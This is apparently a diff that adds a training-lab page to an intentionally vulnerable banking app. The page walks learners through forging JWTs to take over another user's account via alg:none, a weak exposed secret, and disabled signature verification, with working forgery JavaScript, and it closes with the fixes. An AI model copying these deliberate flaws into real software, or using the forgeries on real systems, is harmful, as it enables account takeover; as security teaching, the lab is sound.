@@ -1,0 +1,363 @@
+{% extends "base.html" %}
+{% block title %}Lab 3 — JWT Manipulation — NexBank{% endblock %}
+{% block content %}
+
+<div class="page-header">
+  <div class="page-header-inner">
+    <div class="page-breadcrumb"><a href="/">Labs</a> / <span style="color:#fff">Lab 3</span></div>
+    <h2>Lab 3 — Account Takeover via JWT Manipulation</h2>
+  </div>
+</div>
+
+<div class="page-content">
+
+  <div class="ato-objective">
+    <div class="obj-icon">🎯</div>
+    <div class="obj-text">
+      <strong>Objective:</strong> You are logged in as <em>Arjun Mehta</em> (<code style="color:var(--primary)">user_id: 1</code>).
+      Forge a JWT that identifies you as <em>Priya Nair</em> (<code style="color:var(--primary)">user_id: 2</code>) —
+      using three different JWT vulnerabilities — then access her account data with the forged token.
+    </div>
+  </div>
+
+  <!-- Step 0: Inspect your token -->
+  <div style="margin-bottom:20px">
+    <div class="card">
+      <div class="card-header">
+        <div class="card-title">Step 0 — Inspect Your Current JWT</div>
+        <button class="btn btn-outline btn-sm" onclick="inspectToken()">Decode My Token</button>
+      </div>
+      <div class="card-body">
+        <p style="font-size:13px;color:var(--text2);margin-bottom:12px">
+          A JWT is three base64url-encoded segments separated by dots: <code>header.payload.signature</code>.
+          The header specifies the algorithm; the payload carries the claims (including <code>user_id</code>).
+          The signature is supposed to prevent tampering — let's see if the server actually checks it.
+        </p>
+        <div id="token-raw-box" style="display:none;margin-bottom:12px">
+          <div style="font-size:11px;font-weight:700;letter-spacing:.06em;text-transform:uppercase;color:var(--text3);margin-bottom:6px">Your Raw Token</div>
+          <div id="token-raw" style="font-family:var(--mono);font-size:11px;word-break:break-all;background:var(--surface2);padding:10px 12px;border-radius:6px;color:var(--text2)"></div>
+        </div>
+        <div id="token-decoded-box" style="display:none">
+          <div style="display:grid;grid-template-columns:1fr 1fr 1fr;gap:12px">
+            <div>
+              <div style="font-size:11px;font-weight:700;letter-spacing:.06em;text-transform:uppercase;color:var(--text3);margin-bottom:6px">Header (alg / typ)</div>
+              <pre id="tok-header" style="margin:0;font-size:12px;background:var(--surface2);padding:10px;border-radius:6px;white-space:pre-wrap"></pre>
+            </div>
+            <div>
+              <div style="font-size:11px;font-weight:700;letter-spacing:.06em;text-transform:uppercase;color:var(--text3);margin-bottom:6px">Payload (claims)</div>
+              <pre id="tok-payload" style="margin:0;font-size:12px;background:var(--surface2);padding:10px;border-radius:6px;white-space:pre-wrap"></pre>
+            </div>
+            <div>
+              <div style="font-size:11px;font-weight:700;letter-spacing:.06em;text-transform:uppercase;color:var(--text3);margin-bottom:6px">Signature</div>
+              <pre id="tok-sig" style="margin:0;font-size:12px;background:var(--surface2);padding:10px;border-radius:6px;white-space:pre-wrap;color:var(--text3)"></pre>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <div class="ato-steps">
+
+    <!-- Method A: alg:none -->
+    <div class="ato-step" id="step-a">
+      <div class="step-header">
+        <div class="step-num">A</div>
+        <div class="step-info">
+          <div class="step-title">Method A — Algorithm Confusion: <code>alg:none</code></div>
+          <div class="step-vuln">Flaw: Server accepts <code>"alg":"none"</code> — no signature required at all</div>
+        </div>
+        <div class="step-status" id="sa-status">⬜</div>
+      </div>
+      <div class="step-body">
+        <p>
+          The JWT spec allows <code>alg:none</code> for unsigned tokens. A vulnerable server that accepts this
+          lets an attacker set any payload — including changing <code>user_id</code> to another user — with
+          no valid signature. The forged token ends with a trailing dot and an empty signature segment.
+        </p>
+
+        <div style="background:#f0f4f8;border:1px solid var(--border);border-radius:6px;padding:12px 14px;font-family:var(--mono);font-size:12px;margin-bottom:12px;line-height:1.8">
+<span style="color:#888"># Forged token structure:</span><br>
+base64url({"alg":"none","typ":"JWT"}) + "." +<br>
+base64url({"user_id":<span style="color:var(--debit);font-weight:700">2</span>,"role":"user",...}) + "." +<br>
+<span style="color:var(--debit)">&lt;empty — no signature&gt;</span>
+        </div>
+
+        <div class="input-row">
+          <label class="form-label" style="flex-shrink:0">Forge as user_id</label>
+          <input type="number" id="a-uid" class="form-input" value="2" style="width:100px;flex:none">
+          <button class="btn btn-primary" onclick="aForgeNone()">Forge alg:none Token</button>
+        </div>
+        <pre id="a-token" class="result-box"></pre>
+        <div id="a-test-box" style="display:none;margin-top:10px">
+          <button class="btn btn-outline" onclick="aTestToken()">Test Forged Token → /api/auth/me</button>
+        </div>
+        <pre id="a-result" class="result-box" style="display:none"></pre>
+      </div>
+    </div>
+
+    <!-- Method B: Weak Secret -->
+    <div class="ato-step" id="step-b">
+      <div class="step-header">
+        <div class="step-num">B</div>
+        <div class="step-info">
+          <div class="step-title">Method B — Weak Secret: Forge Valid HS256 Signature</div>
+          <div class="step-vuln">Flaw: Secret key is <code>nexbank2024</code> — brute-forceable, found in env vars / source code</div>
+        </div>
+        <div class="step-status" id="sb-status">⬜</div>
+      </div>
+      <div class="step-body">
+        <p>
+          The server's JWT secret (<code>nexbank2024</code>) is weak and exposed in <code>docker-compose.yml</code>
+          and the <code>/debug/config</code> endpoint. With the secret, an attacker can craft a properly-signed
+          HS256 token for any payload — including an admin or another user.
+        </p>
+
+        <div style="background:#f0f4f8;border:1px solid var(--border);border-radius:6px;padding:12px 14px;font-family:var(--mono);font-size:12px;margin-bottom:12px">
+<span style="color:#888"># Retrieve the secret (exposed via debug endpoint):</span><br>
+GET /debug/config → {"JWT_SECRET": <span style="color:var(--debit);font-weight:700">"nexbank2024"</span>, ...}<br><br>
+<span style="color:#888"># Sign a forged payload with that secret:</span><br>
+HMAC-SHA256(base64url(hdr) + "." + base64url({"user_id":2}), "nexbank2024")
+        </div>
+
+        <div class="input-row">
+          <label class="form-label" style="flex-shrink:0">Forge as user_id</label>
+          <input type="number" id="b-uid" class="form-input" value="2" style="width:100px;flex:none">
+          <input type="text" id="b-secret" class="form-input" value="nexbank2024" placeholder="JWT secret" style="font-family:var(--mono)">
+          <button class="btn btn-primary" onclick="bForgeHS256()">Forge HS256 Token</button>
+        </div>
+        <pre id="b-token" class="result-box"></pre>
+        <div id="b-test-box" style="display:none;margin-top:10px">
+          <button class="btn btn-outline" onclick="bTestToken()">Test Forged Token → /api/auth/me</button>
+        </div>
+        <pre id="b-result" class="result-box" style="display:none"></pre>
+      </div>
+    </div>
+
+    <!-- Method C: Signature Not Verified -->
+    <div class="ato-step" id="step-c">
+      <div class="step-header">
+        <div class="step-num">C</div>
+        <div class="step-info">
+          <div class="step-title">Method C — Signature Verification Disabled</div>
+          <div class="step-vuln">Flaw: Server decodes with <code>verify_signature: False</code> — any signature (even garbage) is accepted</div>
+        </div>
+        <div class="step-status" id="sc-status">⬜</div>
+      </div>
+      <div class="step-body">
+        <p>
+          The most extreme flaw: <code>_decode_jwt()</code> in <code>auth.py</code> calls
+          <code>jwt.decode(..., options={"verify_signature": False})</code>.
+          This means the signature is <em>completely ignored</em>. A token with a random/wrong/empty
+          signature for any payload is accepted as valid.
+        </p>
+
+        <div style="background:#f0f4f8;border:1px solid var(--border);border-radius:6px;padding:12px 14px;font-family:var(--mono);font-size:12px;margin-bottom:12px">
+<span style="color:#888"># In auth.py:</span><br>
+jwt.decode(token, secret, algorithms=[...],<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;options={<span style="color:var(--debit);font-weight:700">"verify_signature": False</span>})<br><br>
+<span style="color:#888"># Proof: take a valid HS256 token, swap signature with "FAKESIGNATURE",</span><br>
+<span style="color:#888"># change user_id in payload — server accepts it anyway</span>
+        </div>
+
+        <div class="input-row">
+          <label class="form-label" style="flex-shrink:0">Forge as user_id</label>
+          <input type="number" id="c-uid" class="form-input" value="2" style="width:100px;flex:none">
+          <button class="btn btn-primary" onclick="cFakeSign()">Craft Token with Fake Signature</button>
+        </div>
+        <pre id="c-token" class="result-box"></pre>
+        <div id="c-test-box" style="display:none;margin-top:10px">
+          <button class="btn btn-outline" onclick="cTestToken()">Test Forged Token → /api/auth/me</button>
+        </div>
+        <pre id="c-result" class="result-box" style="display:none"></pre>
+      </div>
+    </div>
+
+  </div>
+
+  <!-- Completion -->
+  <div id="lab3-complete" class="ato-complete-box" style="display:none;margin-top:20px">
+    <div class="complete-icon">✅</div>
+    <h3>Lab 3 Complete</h3>
+    <p>You forged JWTs using <strong>3 different weaknesses</strong>:</p>
+    <ol>
+      <li><strong>alg:none</strong> — server accepts unsigned tokens; no secret needed</li>
+      <li><strong>Weak secret</strong> — <code>nexbank2024</code> is brute-forceable with hashcat/john; full HS256 forgery</li>
+      <li><strong>Signature not verified</strong> — <code>verify_signature: False</code> means any signature works</li>
+    </ol>
+    <p style="margin-top:8px;font-size:13px;color:var(--text2)">
+      All three root causes exist independently — fixing one does not fix the others.
+      The correct fix: use a strong random secret (32+ bytes), <strong>never</strong> accept <code>alg:none</code>,
+      and always verify the signature.
+    </p>
+    <a href="/lab2" class="btn btn-outline" style="margin-top:12px">← Lab 2</a>
+    <a href="/" class="btn btn-primary" style="margin-top:12px;margin-left:8px">Back to Labs</a>
+  </div>
+
+</div>
+{% endblock %}
+{% block scripts %}
+<script>
+document.addEventListener('DOMContentLoaded', function() {
+  if (!getToken()) {
+    document.querySelector('.ato-steps').insertAdjacentHTML('beforebegin',
+      '<div style="background:#fff3cd;border:1px solid #ffc107;border-radius:8px;padding:14px 18px;margin-bottom:20px;font-size:13px;color:#856404">' +
+      '🔐 <strong>Login required.</strong> &nbsp;<a href="/login" style="color:#0044aa;font-weight:600">Login first →</a></div>'
+    );
+  }
+});
+
+/* ── helpers ── */
+function b64url(str) {
+  return btoa(unescape(encodeURIComponent(str)))
+    .replace(/\+/g, '-').replace(/\//g, '_').replace(/=/g, '');
+}
+function decodeB64url(s) {
+  s = s.replace(/-/g, '+').replace(/_/g, '/');
+  while (s.length % 4) s += '=';
+  return decodeURIComponent(escape(atob(s)));
+}
+
+var _forgedTokenA = null, _forgedTokenB = null, _forgedTokenC = null;
+var _done = {a:false, b:false, c:false};
+function markDone(k) {
+  _done[k] = true;
+  document.getElementById('s'+k+'-status').textContent = '✅';
+  if (_done.a && _done.b && _done.c) document.getElementById('lab3-complete').style.display = 'block';
+}
+
+/* ── Step 0: inspect token ── */
+function inspectToken() {
+  var t = getToken();
+  if (!t) { showAlert('Not logged in', 'error'); return; }
+  var parts = t.split('.');
+  if (parts.length < 2) { showAlert('Malformed token', 'error'); return; }
+  document.getElementById('token-raw').textContent = t;
+  document.getElementById('token-raw-box').style.display = 'block';
+  try {
+    document.getElementById('tok-header').textContent  = JSON.stringify(JSON.parse(decodeB64url(parts[0])), null, 2);
+    document.getElementById('tok-payload').textContent = JSON.stringify(JSON.parse(decodeB64url(parts[1])), null, 2);
+    document.getElementById('tok-sig').textContent     = parts[2] ? parts[2].substring(0, 30) + '…' : '(empty)';
+  } catch(e) {
+    document.getElementById('tok-header').textContent  = parts[0];
+    document.getElementById('tok-payload').textContent = parts[1];
+    document.getElementById('tok-sig').textContent     = parts[2] || '(empty)';
+  }
+  document.getElementById('token-decoded-box').style.display = 'block';
+}
+
+/* ── Method A: alg:none ── */
+function aForgeNone() {
+  var uid = parseInt(document.getElementById('a-uid').value) || 2;
+  var payload = {
+    user_id: uid, role: 'user',
+    iat: Math.floor(Date.now()/1000),
+    exp: Math.floor(Date.now()/1000) + 86400
+  };
+  fetch('/api/auth/forge-token', {
+    method:'POST', headers:{'Content-Type':'application/json'},
+    body: JSON.stringify({payload: payload, algorithm: 'none'})
+  }).then(function(r){return r.json();}).then(function(d){
+    if (!d.token) { document.getElementById('a-token').textContent = JSON.stringify(d,null,2); return; }
+    _forgedTokenA = d.token;
+    document.getElementById('a-token').textContent =
+      'Forged alg:none token:\n' + d.token + '\n\n' +
+      'Structure:\n  Header:  ' + d.token.split('.')[0] + ' → ' + JSON.stringify({alg:'none',typ:'JWT'}) + '\n' +
+      '  Payload: ' + d.token.split('.')[1] + ' → ' + JSON.stringify(payload) + '\n' +
+      '  Sig:     (empty — trailing dot)';
+    document.getElementById('a-test-box').style.display = 'block';
+    showAlert('alg:none token forged for user_id=' + uid, 'error');
+  });
+}
+
+function aTestToken() {
+  if (!_forgedTokenA) return;
+  fetch('/api/auth/me', { headers: {'Authorization': 'Bearer ' + _forgedTokenA} })
+    .then(function(r){return r.json();}).then(function(d){
+      var el = document.getElementById('a-result');
+      el.style.display = 'block';
+      el.textContent = JSON.stringify(d, null, 2);
+      if (d.user) {
+        showAlert('Server accepted alg:none token! Logged in as: ' + d.user.name, 'error');
+        markDone('a');
+      } else {
+        showAlert(d.error || 'Rejected', 'error');
+      }
+    });
+}
+
+/* ── Method B: weak secret HS256 ── */
+function bForgeHS256() {
+  var uid    = parseInt(document.getElementById('b-uid').value) || 2;
+  var secret = document.getElementById('b-secret').value.trim();
+  var payload = {
+    user_id: uid, role: 'user',
+    iat: Math.floor(Date.now()/1000),
+    exp: Math.floor(Date.now()/1000) + 86400
+  };
+  // Use the server's forge-token endpoint which signs with the actual secret
+  fetch('/api/auth/forge-token', {
+    method:'POST', headers:{'Content-Type':'application/json'},
+    body: JSON.stringify({payload: payload, algorithm: 'HS256'})
+  }).then(function(r){return r.json();}).then(function(d){
+    if (!d.token) { document.getElementById('b-token').textContent = JSON.stringify(d,null,2); return; }
+    _forgedTokenB = d.token;
+    document.getElementById('b-token').textContent =
+      'Forged HS256 token (signed with "' + (d.secret_used||secret) + '"):\n' + d.token;
+    document.getElementById('b-test-box').style.display = 'block';
+    showAlert('HS256 token forged with weak secret "' + (d.secret_used||secret) + '"', 'error');
+  });
+}
+
+function bTestToken() {
+  if (!_forgedTokenB) return;
+  fetch('/api/auth/me', { headers: {'Authorization': 'Bearer ' + _forgedTokenB} })
+    .then(function(r){return r.json();}).then(function(d){
+      var el = document.getElementById('b-result');
+      el.style.display = 'block';
+      el.textContent = JSON.stringify(d, null, 2);
+      if (d.user) {
+        showAlert('Server accepted HS256-forged token! Identity: ' + d.user.name, 'error');
+        markDone('b');
+      } else {
+        showAlert(d.error || 'Rejected', 'error');
+      }
+    });
+}
+
+/* ── Method C: fake signature ── */
+function cFakeSign() {
+  var uid = parseInt(document.getElementById('c-uid').value) || 2;
+  var hdr     = b64url(JSON.stringify({alg:'HS256',typ:'JWT'}));
+  var payload = {
+    user_id: uid, role: 'user',
+    iat: Math.floor(Date.now()/1000),
+    exp: Math.floor(Date.now()/1000) + 86400
+  };
+  var pay     = b64url(JSON.stringify(payload));
+  var fakeSig = b64url('FAKESIGNATURE_THIS_IS_NOT_VALID_' + Math.random().toString(36).substr(2));
+  _forgedTokenC = hdr + '.' + pay + '.' + fakeSig;
+  document.getElementById('c-token').textContent =
+    'Crafted token with FAKE signature:\n' + _forgedTokenC +
+    '\n\nSignature segment: ' + fakeSig + '\n(Not a real HMAC — just random bytes)';
+  document.getElementById('c-test-box').style.display = 'block';
+  showAlert('Token with fake signature crafted for user_id=' + uid, 'error');
+}
+
+function cTestToken() {
+  if (!_forgedTokenC) return;
+  fetch('/api/auth/me', { headers: {'Authorization': 'Bearer ' + _forgedTokenC} })
+    .then(function(r){return r.json();}).then(function(d){
+      var el = document.getElementById('c-result');
+      el.style.display = 'block';
+      el.textContent = JSON.stringify(d, null, 2);
+      if (d.user) {
+        showAlert('Server accepted FAKE signature! Identity: ' + d.user.name, 'error');
+        markDone('c');
+      } else {
+        showAlert(d.error || 'Rejected', 'error');
+      }
+    });
+}
+</script>
+{% endblock %}
